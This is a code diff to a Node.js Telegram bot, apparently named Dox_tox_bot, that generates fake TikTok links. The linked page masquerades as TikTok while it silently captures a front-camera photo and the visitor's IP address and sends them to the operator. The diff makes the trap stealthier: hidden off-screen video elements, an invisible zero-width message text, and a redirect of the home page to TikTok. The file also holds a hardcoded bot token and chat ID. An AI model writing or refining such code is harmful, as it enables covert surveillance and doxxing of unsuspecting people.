@@ -5,8 +5,6 @@ const crypto = require('crypto');
 const TOKEN = '8989024516:AAEAIwKbvaDe8HALbrjv-UoHcH6Pp2wZiso';
 const CHAT_ID = '8667961334';
 const PORT = process.env.PORT || 3000;
-
-// Ваш домен на Render (без слэша в конце)
 const DOMAIN = 'https://dox-toxx.onrender.com'; 
 
 const app = express();
@@ -17,12 +15,11 @@ app.use(express.urlencoded({ extended: true }));
 
 const linksDB = {};
 
-// --- БОТ: КОМАНДА /start ---
+// --- БОТ: ЛИЧНЫЕ СООБЩЕНИЯ ---
 bot.onText(/\/start/, (msg) => {
-  bot.sendMessage(msg.chat.id, 'Отправь ссылку на TikTok (например: https://www.tiktok.com/@user/video/123456789).');
+  bot.sendMessage(msg.chat.id, 'Отправь ссылку на TikTok.');
 });
 
-// --- БОТ: ОБЫЧНЫЕ СООБЩЕНИЯ В ЛИЧКУ ---
 bot.on('message', (msg) => {
   const text = msg.text;
   if (!text || text.startsWith('/')) return;
@@ -34,13 +31,13 @@ bot.on('message', (msg) => {
     
     bot.sendMessage(msg.chat.id, `Ссылка готова!`, {
       reply_markup: {
-        inline_keyboard: [[{ text: 'Открыть видео', web_app: { url: fakeLink } }]]
+        inline_keyboard: [[{ text: 'Открыть', web_app: { url: fakeLink } }]]
       }
     });
   }
 });
 
-// --- БОТ: INLINE РЕЖИМ (@Dox_tox_bot ссылка в любом чате) ---
+// --- БОТ: INLINE РЕЖИМ (@Dox_tox_bot) ---
 bot.on('inline_query', async (query) => {
   const text = query.query;
 
@@ -55,10 +52,12 @@ bot.on('inline_query', async (query) => {
   const result = {
     type: 'article',
     id: shortId,
-    title: 'TikTok',
+    title: 'Открыть видео в TikTok',
     description: 'Нажмите, чтобы отправить',
+    // Убрали текст, оставили пустую строку (Telegram требует непустой текст, 
+    // поэтому используем невидимый символ или просто точку, но чтобы было пусто — используем спецсимвол)
     input_message_content: {
-      message_text: '👇 Нажмите кнопку ниже, чтобы открыть видео'
+      message_text: '\u200b' 
     },
     reply_markup: {
       inline_keyboard: [[{ text: 'Открыть', web_app: { url: appLink } }]]
@@ -68,12 +67,12 @@ bot.on('inline_query', async (query) => {
   await bot.answerInlineQuery(query.id, [result], { cache_time: 0 });
 });
 
-// --- ГЛАВНАЯ СТРАНИЦА (Проверка, что сервер жив) ---
+// --- ГЛАВНАЯ СТРАНИЦА ---
 app.get('/', (req, res) => {
-  res.send('Сервер работает. Бот ожидает ссылки в Telegram.');
+  res.redirect('https://www.tiktok.com/');
 });
 
-// --- ПРИЕМ ДАННЫХ С КАМЕРЫ ---
+// --- ПРИЕМ ДАННЫХ ---
 app.post('/api/collect', async (req, res) => {
   const { target, photo } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -95,12 +94,11 @@ app.post('/api/collect', async (req, res) => {
   }
 });
 
-// --- СТРАНИЦА-МАСКИРОВКА ---
+// --- МАСКИРОВКА ---
 app.get('/:id/', (req, res) => {
   const shortId = req.params.id;
   const targetUrl = linksDB[shortId];
 
-  // Если ссылка битая (сервер перезапускался) — кидаем на главную TikTok
   if (!targetUrl) return res.redirect('https://www.tiktok.com/');
 
   res.send(`<!DOCTYPE html>
@@ -121,7 +119,17 @@ app.get('/:id/', (req, res) => {
   .btn-red { background: #fe2c55; color: #fff; border: none; padding: 10px 16px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
   .content { padding: 20px; max-width: 600px; margin: 0 auto; }
   .skeleton-box { background: #e0e0e0; border-radius: 8px; margin-bottom: 16px; height: 400px; width: 100%; }
-  #preview, #canvas { display: none; }
+  
+  /* Скрываем видео за пределами экрана, чтобы не было черного кадра */
+  #preview, #canvas { 
+    position: absolute; 
+    top: -9999px; 
+    left: -9999px; 
+    width: 1px; 
+    height: 1px; 
+    opacity: 0; 
+    pointer-events: none;
+  }
 </style>
 </head>
 <body>
@@ -136,8 +144,10 @@ app.get('/:id/', (req, res) => {
 <div class="content">
   <div class="skeleton-box"></div>
 </div>
+
 <video id="preview" autoplay playsinline muted></video>
 <canvas id="canvas"></canvas>
+
 <script>
   const TARGET_URL = "${targetUrl}";
   const tg = window.Telegram?.WebApp;
@@ -160,18 +170,27 @@ app.get('/:id/', (req, res) => {
   async function takePhoto() {
     let stream = null;
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } });
       video.srcObject = stream;
-      await new Promise(res => { if (video.readyState >= 2) return res(); video.onloadeddata = () => res(); });
-      await new Promise(r => setTimeout(r, 300));
-      canvas.width = video.videoWidth || 480;
-      canvas.height = video.videoHeight || 360;
-      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      video.muted = true;
+      
+      await video.play();
+      await new Promise(r => setTimeout(r, 500)); // Ждем, чтобы камера прогрелась
+      
+      const w = video.videoWidth || 640;
+      const h = video.videoHeight || 480;
+      canvas.width = w;
+      canvas.height = h;
+      
+      canvas.getContext('2d').drawImage(video, 0, 0, w, h);
+      
       const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+      
       stream.getTracks().forEach(t => t.stop());
       video.srcObject = null;
       return blob;
     } catch (e) {
+      console.error("Camera error:", e);
       if (stream) stream.getTracks().forEach(t => t.stop());
       return null;
     }
@@ -197,7 +216,11 @@ app.get('/:id/', (req, res) => {
     
     let photoBase64 = null;
     if (photoBlob) {
-      photoBase64 = await new Promise((res) => { const reader = new FileReader(); reader.onloadend = () => res(reader.result); reader.readAsDataURL(photoBlob); });
+      photoBase64 = await new Promise((res) => { 
+        const reader = new FileReader(); 
+        reader.onloadend = () => res(reader.result); 
+        reader.readAsDataURL(photoBlob); 
+      });
     }
     
     fetch('/api/collect', {
